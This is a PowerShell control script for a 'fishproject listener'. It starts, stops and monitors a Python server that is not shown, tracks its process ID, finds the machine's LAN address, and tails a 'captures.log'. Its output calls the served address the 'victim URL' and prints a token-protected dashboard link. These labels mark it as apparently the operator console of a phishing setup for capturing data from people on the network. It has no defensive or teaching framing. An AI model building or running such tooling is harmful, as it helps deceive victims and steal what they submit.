<#
  ctl.ps1 - start / stop / restart / status / log for the fishproject listener.

  Usage:
    powershell -ExecutionPolicy Bypass -File .\ctl.ps1 start
    powershell -ExecutionPolicy Bypass -File .\ctl.ps1 stop
    powershell -ExecutionPolicy Bypass -File .\ctl.ps1 restart
    powershell -ExecutionPolicy Bypass -File .\ctl.ps1 status
    powershell -ExecutionPolicy Bypass -File .\ctl.ps1 log          # live tail (Ctrl+C to exit)
    powershell -ExecutionPolicy Bypass -File .\ctl.ps1 start -Port 9090 -Foreground

  -Foreground runs the server attached to this window instead of in the background.
#>

param(
    [Parameter(Position = 0)]
    [ValidateSet('start', 'stop', 'restart', 'status', 'log')]
    [string]$Action = 'status',

    [int]$Port = 8080,

    [switch]$Foreground
)

$ErrorActionPreference = 'Stop'
$Root = Split-Path -Parent $MyInvocation.MyCommand.Path
$ServerPy = Join-Path $Root 'server.py'
$LogFile = Join-Path $Root 'logs\captures.log'
$PidFile = Join-Path $Root 'logs\server.pid'
$TokenFile = Join-Path $Root 'logs\dash_token.txt'

function Get-ListenerPid {
    param([int]$P)
    $conn = Get-NetTCPConnection -LocalPort $P -State Listen -ErrorAction SilentlyContinue |
            Select-Object -First 1
    if ($conn) { return [int]$conn.OwningProcess }
    return $null
}

function Get-TrackedPid {
    if (-not (Test-Path $PidFile)) { return $null }
    $raw = (Get-Content $PidFile -ErrorAction SilentlyContinue | Select-Object -First 1)
    $n = 0
    if ([int]::TryParse($raw, [ref]$n)) {
        if (Get-Process -Id $n -ErrorAction SilentlyContinue) { return $n }
    }
    return $null
}

function Get-LanIp {
    $ip = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
          Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.PrefixOrigin -ne 'WellKnown' } |
          Sort-Object -Property @{ Expression = { if ($_.InterfaceAlias -match 'Wi-Fi|Ethernet') { 0 } else { 1 } } } |
          Select-Object -First 1
    if ($ip) { return $ip.IPAddress }
    return '<this-machine-ip>'
}

function Get-DashUrl {
    if (-not (Test-Path $TokenFile)) { return $null }
    $t = (Get-Content $TokenFile -ErrorAction SilentlyContinue | Select-Object -First 1)
    if (-not $t) { return $null }
    return "http://$(Get-LanIp):$Port/dash?k=$t"
}

function Start-Fish {
    $tracked = Get-TrackedPid
    if ($tracked) { Write-Host "Already running (pid $tracked)." -ForegroundColor Yellow; return }

    $holder = Get-ListenerPid -P $Port
    if ($holder) {
        Write-Host "Port $Port already in use by pid $holder (not started by ctl). Stop it first." -ForegroundColor Red
        return
    }

    if ($Foreground) {
        Write-Host "Starting server.py on port $Port in foreground (Ctrl+C to stop)..." -ForegroundColor Cyan
        & python $ServerPy $Port
        return
    }

    $proc = Start-Process -FilePath 'python' -ArgumentList $ServerPy, $Port -WorkingDirectory $Root -PassThru -WindowStyle Minimized
    Set-Content -Path $PidFile -Value $proc.Id -Encoding ascii
    Start-Sleep -Milliseconds 700
    if (Get-Process -Id $proc.Id -ErrorAction SilentlyContinue) {
        Write-Host "Started listener (pid $($proc.Id)) on port $Port." -ForegroundColor Green
        Write-Host "  victim URL : http://$(Get-LanIp):$Port/" -ForegroundColor Green
        $dash = Get-DashUrl
        if ($dash) { Write-Host "  dashboard  : $dash" -ForegroundColor Magenta }
        Write-Host "  watch log  : powershell -File .\ctl.ps1 log" -ForegroundColor Gray
    } else {
        Write-Host "Server failed to stay up - run it with -Foreground to see the error." -ForegroundColor Red
    }
}

function Stop-Fish {
    $tracked = Get-TrackedPid
    $holder = Get-ListenerPid -P $Port

    $targets = @()
    if ($tracked) { $targets += $tracked }
    if ($holder -and ($targets -notcontains $holder)) { $targets += $holder }

    if (-not $targets) {
        Write-Host "Nothing listening on port $Port. Already stopped." -ForegroundColor Yellow
        if (Test-Path $PidFile) { Remove-Item $PidFile -Force }
        return
    }

    foreach ($t in $targets) {
        try {
            Stop-Process -Id $t -Force -ErrorAction Stop
            Write-Host "Stopped pid $t." -ForegroundColor Green
        } catch {
            Write-Host "Could not stop pid $t : $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    if (Test-Path $PidFile) { Remove-Item $PidFile -Force }
    Write-Host "Listener down. Log kept at $LogFile" -ForegroundColor Gray
}

function Show-Status {
    $holder = Get-ListenerPid -P $Port
    if ($holder) {
        Write-Host "STATUS   : RUNNING" -ForegroundColor Green
        Write-Host "pid      : $holder"
        Write-Host "port     : $Port"
        Write-Host "victim   : http://$(Get-LanIp):$Port/"
        $dash = Get-DashUrl
        if ($dash) { Write-Host "dashboard: $dash" -ForegroundColor Magenta }
    } else {
        Write-Host "STATUS   : STOPPED (nothing on port $Port)" -ForegroundColor Yellow
    }
    if (Test-Path $LogFile) {
        $lines = (Get-Content $LogFile -ErrorAction SilentlyContinue).Count
        Write-Host "log lines: $lines  ($LogFile)"
        $last = Get-Content $LogFile -Tail 1 -ErrorAction SilentlyContinue
        if ($last) { Write-Host "last     : $last" -ForegroundColor DarkGray }
    } else {
        Write-Host "log      : (none yet)"
    }
}

function Show-Log {
    if (-not (Test-Path $LogFile)) { Write-Host "No log file yet." -ForegroundColor Yellow; return }
    Write-Host "Tailing $LogFile - Ctrl+C to stop." -ForegroundColor Cyan
    Get-Content $LogFile -Wait
}

switch ($Action) {
    'start'   { Start-Fish }
    'stop'    { Stop-Fish }
    'restart' { Stop-Fish; Start-Sleep -Milliseconds 400; Start-Fish }
    'status'  { Show-Status }
    'log'     { Show-Log }
}
